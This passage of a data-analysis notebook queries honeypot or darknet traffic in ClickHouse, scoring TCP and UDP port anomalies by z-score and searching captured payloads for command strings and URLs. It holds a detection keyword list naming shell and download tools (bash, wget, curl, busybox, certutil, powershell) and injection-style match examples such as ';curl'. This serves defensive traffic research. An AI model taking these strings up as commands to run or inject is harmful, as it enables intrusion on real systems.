- `port`, `hour`, and `packets` identify the candidate; 
- `baseline_avg_packets` and `baseline_stddev` describe the other hours; 
- `z_score` measures the upward deviation. Filtering and sorting use unrounded expressions.

In [30]:
# Configuration
WINDOW_START = "2026-09-01 00:00:00"
WINDOW_END = "2026-09-05 00:00:00"
Z_THRESHOLD = 3.0
MIN_ANOMALY_PACKETS = 100
RESULT_LIMIT = 50

tcp_anomalies_sql = f"""
WITH
    toDateTime64({{window_start:String}}, 3, 'Europe/Warsaw') AS window_start,
    toDateTime64({{window_end:String}}, 3, 'Europe/Warsaw') AS window_end,
    {{z_threshold:Float64}} AS z_threshold,
    {{min_packets:UInt64}} AS min_packets,
    dateDiff('hour', window_start, window_end) - 1 AS baseline_hours,
    hourly AS
    (
        SELECT
            tupleElement(entry, 1) AS port,
            toStartOfHour(start_time) AS hour,
            sum(toUInt64(tupleElement(entry, 2))) AS packets
        FROM {TCP_TABLE}
        ARRAY JOIN arrayZip(
            mapKeys(destination_ports), mapValues(destination_ports)
        ) AS entry
        WHERE start_time >= window_start AND start_time < window_end
        GROUP BY port, hour
    ),
    port_totals AS
    (
        SELECT
            port,
            hour,
            packets,
            sum(toFloat64(packets)) OVER (PARTITION BY port) AS total_packets,
            sum(toFloat64(packets) * toFloat64(packets)) OVER (PARTITION BY port) AS total_squared_packets
        FROM hourly
    ),
    baselines AS
    (
        SELECT
            port,
            hour,
            packets,
            (total_packets - toFloat64(packets)) / baseline_hours AS baseline_mean,
            sqrt(greatest(
                (total_squared_packets - toFloat64(packets) * toFloat64(packets)) / baseline_hours
                    - pow((total_packets - toFloat64(packets)) / baseline_hours, 2),
                0.
            )) AS baseline_stddev
        FROM port_totals
    ),
    scored AS
    (
        SELECT
            port,
            hour,
            packets,
            baseline_mean,
            baseline_stddev,
            (toFloat64(packets) - baseline_mean) / nullIf(baseline_stddev, 0) AS z_score
        FROM baselines
    )
SELECT
    port,
    hour,
    packets,
    round(baseline_mean, 2) AS baseline_avg_packets,
    round(baseline_stddev, 2) AS baseline_stddev,
    round(z_score, 2) AS z_score
FROM scored
WHERE packets >= min_packets
  AND (ifNull(z_score >= z_threshold, 0)
       OR (baseline_stddev = 0 AND toFloat64(packets) > baseline_mean))
ORDER BY isNull(z_score), z_score DESC, packets DESC
LIMIT {{result_limit:UInt64}}
"""



In [31]:
tcp_anomalies = run_query(tcp_anomalies_sql, {
    "window_start": WINDOW_START, "window_end": WINDOW_END,
    "z_threshold": Z_THRESHOLD, "min_packets": MIN_ANOMALY_PACKETS,
    "result_limit": RESULT_LIMIT,
})
display(tcp_anomalies)

,port,hour,packets,baseline_avg_packets,baseline_stddev,z_score
0,53001,2026-09-03 02:00:00+02:00,211423,270.08,85.18,2478.82
1,27893,2026-09-03 15:00:00+02:00,212119,318.94,97.03,2182.83
2,27860,2026-09-02 22:00:00+02:00,212399,470.09,148.93,1423.05
3,20861,2026-09-02 19:00:00+02:00,212303,403.43,179.22,1182.32
4,27865,2026-09-03 00:00:00+02:00,212188,480.33,183.96,1150.86
5,1964,2026-09-03 06:00:00+02:00,212268,591.00,186.12,1137.33
6,27946,2026-09-04 17:00:00+02:00,211355,480.04,190.10,1109.29
7,51412,2026-09-01 15:00:00+02:00,212476,436.63,195.93,1082.22
8,27788,2026-09-01 10:00:00+02:00,174540,424.22,166.47,1045.96
9,27904,2026-09-03 19:00:00+02:00,211435,541.32,203.02,1038.76


**Research ideas:**
- <mark>identify sources that took part in the anomaly and fingerprint them (ML usage is encouraged);</mark>
- <mark>collerate anomalies with published vulnerabilities.</mark>

## UDP port anomalies

This query finds unusually high hourly packet counts for each UDP destination port, using the same query structure as the TCP analysis with `UDP_TABLE` as its source. The query expands the `destination_ports` map and sums its per-port counts, assigning each event to the hour containing `start_time`.

**Configuration:** 
- `WINDOW_START` define a start-inclusive window in `Europe/Warsaw`; 
- `WINDOW_END` define an end-exclusive window in `Europe/Warsaw`; 
- `Z_THRESHOLD` sets the minimum positive z-score; 
- `MIN_ANOMALY_PACKETS` excludes small counts; 
- `RESULT_LIMIT` caps returned port-hour rows.

**Calculation:** each port-hour is compared with that same port's other hours across the full date range. Missing port-hours count as zero. The z-score is `(packets - baseline_mean) / baseline_stddev`, using population standard deviation and excluding the hour being scored. Both earlier and later hours contribute to the baseline.

**Results:** 
- `port`, `hour`, and `packets` identify the candidate. 
- `baseline_avg_packets`, `baseline_stddev`, and `z_score` describe its deviation.

In [32]:
# Configuration
WINDOW_START = "2026-09-01 00:00:00"
WINDOW_END = "2026-09-05 00:00:00"
Z_THRESHOLD = 3.0
MIN_ANOMALY_PACKETS = 100
RESULT_LIMIT = 50

udp_anomalies_sql = f"""
WITH
    toDateTime64({{window_start:String}}, 3, 'Europe/Warsaw') AS window_start,
    toDateTime64({{window_end:String}}, 3, 'Europe/Warsaw') AS window_end,
    {{z_threshold:Float64}} AS z_threshold,
    {{min_packets:UInt64}} AS min_packets,
    dateDiff('hour', window_start, window_end) - 1 AS baseline_hours,
    hourly AS
    (
        SELECT
            tupleElement(entry, 1) AS port,
            toStartOfHour(start_time) AS hour,
            sum(toUInt64(tupleElement(entry, 2))) AS packets
        FROM {UDP_TABLE}
        ARRAY JOIN arrayZip(
            mapKeys(destination_ports), mapValues(destination_ports)
        ) AS entry
        WHERE start_time >= window_start AND start_time < window_end
        GROUP BY port, hour
    ),
    port_totals AS
    (
        SELECT
            port,
            hour,
            packets,
            sum(toFloat64(packets)) OVER (PARTITION BY port) AS total_packets,
            sum(toFloat64(packets) * toFloat64(packets)) OVER (PARTITION BY port) AS total_squared_packets
        FROM hourly
    ),
    baselines AS
    (
        SELECT
            port,
            hour,
            packets,
            (total_packets - toFloat64(packets)) / baseline_hours AS baseline_mean,
            sqrt(greatest(
                (total_squared_packets - toFloat64(packets) * toFloat64(packets)) / baseline_hours
                    - pow((total_packets - toFloat64(packets)) / baseline_hours, 2),
                0.
            )) AS baseline_stddev
        FROM port_totals
    ),
    scored AS
    (
        SELECT
            port,
            hour,
            packets,
            baseline_mean,
            baseline_stddev,
            (toFloat64(packets) - baseline_mean) / nullIf(baseline_stddev, 0) AS z_score
        FROM baselines
    )
SELECT
    port,
    hour,
    packets,
    round(baseline_mean, 2) AS baseline_avg_packets,
    round(baseline_stddev, 2) AS baseline_stddev,
    round(z_score, 2) AS z_score
FROM scored
WHERE packets >= min_packets
  AND (ifNull(z_score >= z_threshold, 0)
       OR (baseline_stddev = 0 AND toFloat64(packets) > baseline_mean))
ORDER BY isNull(z_score), z_score DESC, packets DESC
LIMIT {{result_limit:UInt64}}
"""

In [33]:
udp_anomalies = run_query(udp_anomalies_sql, {
    "window_start": WINDOW_START, "window_end": WINDOW_END,
    "z_threshold": Z_THRESHOLD, "min_packets": MIN_ANOMALY_PACKETS,
    "result_limit": RESULT_LIMIT,
})
display(udp_anomalies)

,port,hour,packets,baseline_avg_packets,baseline_stddev,z_score
0,2164,2026-09-01 08:00:00+02:00,110234,22.94,5.79,19038.22
1,8854,2026-09-01 08:00:00+02:00,89402,21.51,4.88,18302.01
2,3060,2026-09-02 21:00:00+02:00,211468,23.43,11.84,17857.37
3,32810,2026-09-01 02:00:00+02:00,45224,21.43,5.01,9017.18
4,32766,2026-09-04 12:00:00+02:00,45041,21.92,5.14,8759.51
5,32762,2026-09-01 14:00:00+02:00,41601,21.96,5.09,8164.52
6,32752,2026-09-04 13:00:00+02:00,44601,22.28,5.46,8162.84
7,4343,2026-09-04 10:00:00+02:00,209279,24.67,25.68,8148.28
8,51418,2026-09-03 01:00:00+02:00,210313,27.04,25.82,8144.18
9,2572,2026-09-01 14:00:00+02:00,210572,25.35,25.89,8131.60


**Research ideas:**
- <mark>identify sources that took part in the anomaly and fingerprint them (ML usage is encouraged);</mark>
- <mark>collerate anomalies with published vulnerabilities;</mark>
- <mark>cross-correlate specific anomalies with payloads table.</mark>

## Payloads containing configured command strings

This query finds payload records containing at least one configured command token using ClickHouse's regex `match()` function. The original payload content is returned for inspection.

**Configuration:** set `COMMAND_NAMES`, `RESULT_LIMIT`, and optional `PAYLOAD_DATE_START` / `PAYLOAD_DATE_END` bounds in the following cell, and set `PAYLOAD_TABLE` in the main configuration cell. Use non-empty search terms. The window filters daily records by `date`, with an inclusive start and exclusive end. Set either date bound to `None` to remove it, or both to `None` for the entire table; sub-day packet filtering is not available from daily aggregates.

**Matching semantics:** matching is case-insensitive and requires the command to be bounded by the start/end of the payload or characters outside `[a-z0-9_.-]`. `/bin/sh`, `busybox sh`, and `;curl` match, but `shell`, `flash`, `libcurl`, and `script.sh` do not. Command names are escaped as literal text before building RE2-compatible patterns. Matching command-like text does not prove execution; standalone names in prose or binary data can still match.

**Results:** `matched_commands` lists the configured command names found in each payload. Rows are grouped by `(hash, payload, coding)` and ranked by `total_packets`, then `source_count`. Counts combine matching daily records: `source_count` is distinct sources, `observed_days` is distinct dates, and `earliest_seen` / `latest_seen` are observation bounds. A record contributes its packet count once even if several commands match.

In [34]:
# Configuration
RESULT_LIMIT = 50
PAYLOAD_DATE_START = "2026-09-01"  # Set to None for no lower date bound.
PAYLOAD_DATE_END = "2026-09-02"    # Set to None for no upper date bound.
COMMAND_NAMES = [
    "sh", "bash", "wget", "curl", "chmod", "busybox",
    "powershell", "cmd.exe", "certutil", "whoami", "uname",
]

import re

if not COMMAND_NAMES or any(not command.strip() for command in COMMAND_NAMES):
    raise ValueError("COMMAND_NAMES must contain at least one non-empty command name.")
COMMAND_PATTERNS = [
    rf"(?i)(^|[^a-z0-9_.-])({re.escape(command)})($|[^a-z0-9_.-])"
    for command in COMMAND_NAMES
]

payload_commands_sql = f"""
SELECT
    hash AS payload_hash,
    payload,
    coding,
    arrayFilter(
        (command, pattern) -> match(payload, pattern),
        {{command_names:Array(String)}}, {{command_patterns:Array(String)}}
    ) AS matched_commands,
    sum(packet_count) AS total_packets,
    uniqExact(src_ip) AS source_count,
    uniqExact(date) AS observed_days,
    min(first_seen) AS earliest_seen,
    max(last_seen) AS latest_seen
FROM {PAYLOAD_TABLE}
WHERE notEmpty(matched_commands)
  AND ({{date_start:Nullable(Date)}} IS NULL OR date >= {{date_start:Nullable(Date)}})
  AND ({{date_end:Nullable(Date)}} IS NULL OR date < {{date_end:Nullable(Date)}})
GROUP BY hash, payload, coding
ORDER BY total_packets DESC, source_count DESC, payload_hash
LIMIT {{result_limit:UInt64}}
"""



In [ ]:
payload_commands = run_query(payload_commands_sql, {
    "date_start": PAYLOAD_DATE_START, "date_end": PAYLOAD_DATE_END,
    "command_names": COMMAND_NAMES, "result_limit": RESULT_LIMIT,
    "command_patterns": COMMAND_PATTERNS,
})
display(payload_commands)

**Research ideas:**
- <mark>come up with a more sophisticated approach to distinguish between "interesting" and "uninteresting" payloads;</mark>
- <mark>try to identify a corresponding CVE for a specific payload.</mark>

## Payloads containing URLs

This query extracts HTTP and HTTPS URL candidates from stored payload text, case-insensitively.

**Configuration:** set `RESULT_LIMIT` and optional `PAYLOAD_DATE_START` / `PAYLOAD_DATE_END` bounds here, and `PAYLOAD_TABLE` in the main configuration cell. The window filters daily records by `date`, with an inclusive start and exclusive end. Set either date bound to `None` to remove it, or both to `None` for the entire table; sub-day packet filtering is not available from daily aggregates.

**Results:** each row describes one `(url, hash, payload, coding)` group and includes the original payload. `source_count` counts distinct sources, `observed_days` counts distinct dates, and `matching_payload_records` counts daily database records. `packets_with_matching_payload` sums the represented packet counts; it is not a count of URL occurrences or HTTP requests. Results rank by packet volume, then source count.

A repeated URL is deduplicated within a payload record. A record containing several different URLs contributes its packet count once to each URL, so summing results across URLs can double-count packets.

In [ ]:
# Configuration
RESULT_LIMIT = 50
PAYLOAD_DATE_START = "2026-09-01"  # Set to None for no lower date bound.
PAYLOAD_DATE_END = "2026-09-02"    # Set to None for no upper date bound.

payload_urls_sql = f"""
WITH extracted AS
(
    SELECT
        date,
        src_ip,
        first_seen,
        last_seen,
        packet_count,
        hash,
        payload,
        coding,
        arrayDistinct(extractAll(
            payload,
            '(?i)https?://[^\\\\s<>"\\\\x27\\\\x00-\\\\x1F\\\\x7F]+'
        )) AS urls
    FROM {PAYLOAD_TABLE}
    WHERE ({{date_start:Nullable(Date)}} IS NULL OR date >= {{date_start:Nullable(Date)}})
      AND ({{date_end:Nullable(Date)}} IS NULL OR date < {{date_end:Nullable(Date)}})
)
SELECT
    url,
    hash AS payload_hash,
    payload,
    coding,
    uniqExact(src_ip) AS source_count,
    uniqExact(date) AS observed_days,
    min(first_seen) AS earliest_seen,
    max(last_seen) AS latest_seen,
    count() AS matching_payload_records,
    sum(packet_count) AS packets_with_matching_payload
FROM extracted
ARRAY JOIN urls AS url
GROUP BY url, hash, payload, coding
ORDER BY packets_with_matching_payload DESC, source_count DESC, url
LIMIT {{result_limit:UInt64}}
"""



In [ ]:
payload_urls = run_query(payload_urls_sql, {
    "date_start": PAYLOAD_DATE_START, "date_end": PAYLOAD_DATE_END,
    "result_limit": RESULT_LIMIT,
})
display(payload_urls)

**Research ideas:**
<mark>- find sources that refer to the same domains.</mark>

<a style='text-decoration:none;line-height:16px;display:flex;color:#5B5B62;padding:10px;justify-content:end;' href='https://deepnote.com?utm_source=created-in-deepnote-cell&projectId=e909263f-d3b3-4406-a98e-75dc484a5da4' target="_blank">

Created in <span style='font-weight:600;margin-left:4px;'>Deepnote</span></a>